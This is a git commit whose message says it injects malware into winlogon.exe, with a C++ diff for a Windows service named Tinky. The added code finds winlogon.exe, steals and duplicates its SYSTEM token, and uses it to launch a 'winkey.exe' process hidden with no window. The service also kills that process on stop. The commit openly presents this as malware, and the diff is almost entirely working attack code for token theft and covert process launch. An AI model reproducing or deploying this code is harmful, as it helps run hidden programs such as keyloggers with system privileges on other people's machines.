32da291515ca85bafef4b795ecf6ad50edc602e7
Dei Gott <dollyetal@proton.me>
2023-09-08 18:09:57 +0100

    Injecting the malware into the winlogon.exe.

--- tinky/main.cpp
+++ tinky/main.cpp
@@ -1,55 +1,282 @@
 #include "Tinky.hpp"
 
-VOID WINAPI ServiceMain(DWORD dwArgc, LPTSTR* lpszArgv)
-{
-	(void)dwArgc;
-	(void)lpszArgv;
-	STARTUPINFOW si = { 0 };
-	PROCESS_INFORMATION pi = { 0 };
 
-	CreateProcessW(
-		L"C:\\Windows\\System32\\notepad.exe",
+SERVICE_STATUS_HANDLE	__hServiceStatusHandle;
+SERVICE_STATUS			__ServiceStatus;
+HANDLE                  __serviceStopEvent;
+HANDLE					__winkeyPrimaryToken;
+
+DWORD	getPidByProcName(char* filename)
+{
+	BOOL				__processEntryStatus;
+	HANDLE				__hSnapShot;
+	PROCESSENTRY32		__processEntry;
+
+	/* akes a snapshot of the specified processes, as well as the heaps, modules, and threads used by these processes. */
+	__hSnapShot = CreateToolhelp32Snapshot(
+		TH32CS_SNAPALL,
+		NULL
+	);
+
+	__processEntry.dwSize = sizeof(PROCESSENTRY32);
+
+	/* Retrieves information about the first process encountered in a system snapshot. */
+	__processEntryStatus = Process32First(
+		__hSnapShot,
+		&__processEntry
+	);
+	
+	/*
+		if the first entry of the process list has been copied to the buffer.
+		Loop over all processes. and search for the specified process.
+	*/
+	while (__processEntryStatus)
+	{
+		/* If specified process found, return its pid. */
+		if (strncmp(__processEntry.szExeFile, filename, strlen(filename)) == 0)
+		{
+			CloseHandle(
+				__hSnapShot
+			);
+			return (__processEntry.th32ProcessID);
+		}
+		__processEntryStatus = Process32Next(
+			__hSnapShot,
+			&__processEntry
+		);
+	}
+
+	CloseHandle(
+		__hSnapShot
+	);
+	return (0);
+}
+
+/*  Sets the current service status and reports it to the SCM. */
+void ReportSvcStatus(DWORD state, DWORD Q_ERROR)
+{
+	BOOL	__setServiceStatus;
+
+	/* TO-DO: Contains status information for a service. */
+	__ServiceStatus.dwServiceType = SERVICE_WIN32_OWN_PROCESS;
+	__ServiceStatus.dwControlsAccepted = 0;
+	if (state != SERVICE_START_PENDING) {
+		__ServiceStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN;
+	}
+	__ServiceStatus.dwCurrentState = state;
+	__ServiceStatus.dwWin32ExitCode = Q_ERROR;
+	__ServiceStatus.dwServiceSpecificExitCode = 0;
+	__ServiceStatus.dwCheckPoint = 0;
+
+	/* TO-DO: Updates the service control manager's status information for the calling service.*/
+	__setServiceStatus = SetServiceStatus(
+		__hServiceStatusHandle,
+		&__ServiceStatus
+	);
+
+	if (!__setServiceStatus)
+		return;
+	return;
+}
+
+
+VOID	kill_winky(void)
+{
+	DWORD	__winkeyPID;
+	HANDLE	__hWinkeyProcess;
+	BOOL	__terminateProcessStatus;
+
+	/* TO-DO: open process by pid and terminate it */
+	__winkeyPID = getPidByProcName("winkey.exe");
+
+	__hWinkeyProcess = OpenProcess(
+		PROCESS_TERMINATE,
+		NULL,
+		__winkeyPID
+	);
+
+	__terminateProcessStatus = TerminateProcess(
+		__hWinkeyProcess,
+		1
+	);
+
+	CloseHandle(__hWinkeyProcess);
+	return;
+}
+
+void WINAPI LServiceProcessHandler(
+	DWORD dwControl
+)
+{
+	// Handle the requested control code. 
+	BOOL __setEventStatus;
+
+	switch (dwControl)
+	{
+		case SERVICE_CONTROL_STOP:
+			ReportSvcStatus(SERVICE_STOP_PENDING, NO_ERROR);
+
+			/* Stops/kill our winkey process */
+			kill_winky();
+			/* Signal the service to stop. */
+
+			__setEventStatus = SetEvent(__serviceStopEvent);
+			ReportSvcStatus(__ServiceStatus.dwCurrentState, NO_ERROR);
+
+			return;
+		default:
+			break;
+	}
+}
+
+
+VOID	start_winkey()
+{
+	//char					__WinkeyFullPath[260];
+	BOOL					__openProcessTokenStatus;
+	BOOL					__duplicateTokenStatus;
+	BOOL					__createProcessAsUserStatus;
+	DWORD					__winLogonPID;
+	HANDLE					__hWinLogonProcess;
+	HANDLE					__hWinLoginToken;
+	STARTUPINFO				__startUpInfo;
+	PROCESS_INFORMATION		__winkeyProcessInfo;
+	/**
+	* Retrieves the fully qualified path for the file that contains the specified module.
+	* The module must have been loaded by the current process.
+	*/
+
+	//if (!GetCurrentDirectory(260, __WinkeyFullPath))
+	//	return ;
+
+	//strcat_s(__WinkeyFullPath, "\\winkey.exe");
+	char* deb = WINKEY_PATH;
+	LPCSTR __WinkeyFullPath = deb;
+	ZeroMemory(&__startUpInfo, sizeof(__startUpInfo));
+	__startUpInfo.cb = sizeof(__startUpInfo);
+
+
+	__winLogonPID = getPidByProcName("winlogon.exe");
+
+	/* Opens a winlogon local process object. */
+
+	__hWinLogonProcess =  OpenProcess(
+		PROCESS_QUERY_INFORMATION,
+		0,
+		__winLogonPID
+	);
+
+	if (__hWinLogonProcess == NULL)
+		return;
+
+	/* Opens the access token associated with winlogon process. */
+	__openProcessTokenStatus = OpenProcessToken(
+		__hWinLogonProcess,
+		TOKEN_DUPLICATE,
+		&__hWinLoginToken
+	);
+
+	CloseHandle(__hWinLogonProcess);
+	
+	if (__openProcessTokenStatus == NULL)
+		return;
+
+	__duplicateTokenStatus = DuplicateTokenEx(
+		__hWinLoginToken,
+		TOKEN_ALL_ACCESS,
+		NULL,
+		SecurityDelegation,
+		TokenPrimary,
+		&__winkeyPrimaryToken
+	);
+
+	CloseHandle(__hWinLoginToken);
+	if (!__duplicateTokenStatus)
+	{
+		std::cerr << "(-) failed to duplicate token." << std::endl;
+		return;
+	}
+
+	/* Creates a new process and its primary thread. The new process runs in the security context of the user represented by the specified token. */
+	__createProcessAsUserStatus = CreateProcessAsUserA(
+		__winkeyPrimaryToken,
+		__WinkeyFullPath,
 		NULL,
 		NULL,
 		NULL,
 		FALSE,
-		BELOW_NORMAL_PRIORITY_CLASS,
+		CREATE_NO_WINDOW,
 		NULL,
 		NULL,
-		&si,
-		&pi
+		&__startUpInfo,
+		&__winkeyProcessInfo
 	);
+
+	if (!__createProcessAsUserStatus)
+	{
+		std::cerr << "(-) failed to create process." << std::endl;
+		return;
+	}
 }
 
-// Logs messages to the event log
-//VOID SvcReportEvent(LPTSTR szFunction)
-//{
-//	HANDLE hEventSource;
-//	LPCTSTR lpszStrings[2];
-//	TCHAR Buffer[80];
-//
-//	hEventSource = RegisterEventSource(NULL, SVCNAME);
-//
-//	if (NULL != hEventSource)
-//	{
-//		StringCchPrintf(Buffer, 80, TEXT("%s failed with %d"), szFunction, GetLastError());
-//
-//		lpszStrings[0] = SVCNAME;
-//		lpszStrings[1] = Buffer;
-//
-//		ReportEvent(hEventSource,        // event log handle
-//			EVENTLOG_ERROR_TYPE, // event type
-//			0,                   // event category
-//			SVC_ERROR,           // event identifier
-//			NULL,                // no security identifier
-//			2,                   // size of lpszStrings array
-//			0,                   // no binary data
-//			lpszStrings,         // array of strings
-//			NULL);               // no binary data
-//
-//		DeregisterEventSource(hEventSource);
-//	}
-//}
+VOID SvcInit(DWORD dwArgc, LPTSTR* lpszArgv)
+{
+	/**
+	* TO_DO: Declare and set any required variables.
+	* Be sure to periodically call ReportSvcStatus() with 
+	* SERVICE_START_PENDING. If initialization fails, call
+	* ReportSvcStatus with SERVICE_STOPPED.
+	*/
+
+	(void)dwArgc;
+	(void)lpszArgv;
+	/* Create an event.The control handler function, LServiceProcessHandler */
+	/* signals this event when it receives the stop control code. */
+	__serviceStopEvent =  CreateEvent(
+		NULL,
+		TRUE,
+		FALSE,
+		NULL
+	);
+
+	if (__serviceStopEvent == NULL)
+	{
+		ReportSvcStatus(SERVICE_STOPPED, GetLastError());
+		return;
+	}
+
+	/* Report running status when initialization is complete. */
+	ReportSvcStatus(SERVICE_RUNNING, NO_ERROR);
+
+	/* Starting winky background process. */
+	start_winkey();
+
+	/* Check whether to stop the service. */
+	WaitForSingleObject(__serviceStopEvent, INFINITE);
+	ReportSvcStatus(SERVICE_STOPPED, NOERROR);
+
+	return;
+}
+
+VOID WINAPI ServiceMain(DWORD dwArgc, LPTSTR* lpszArgv)
+{
+	__hServiceStatusHandle = RegisterServiceCtrlHandler(
+		SVCNAME,
+		LServiceProcessHandler
+	);
+
+	if (__hServiceStatusHandle == NULL)
+	{
+		std::cerr << "(-) failed register service control handler to SCManager." << std::endl;
+		return;
+	}
+
+	/* Report initial status to the SCM */
+	ReportSvcStatus(SERVICE_START_PENDING, NO_ERROR);
+
+	/* Perform service - specific initialization and work. */
+	SvcInit(dwArgc, lpszArgv);
+}
 
 BOOL	_processEntryPoint(void)
 {
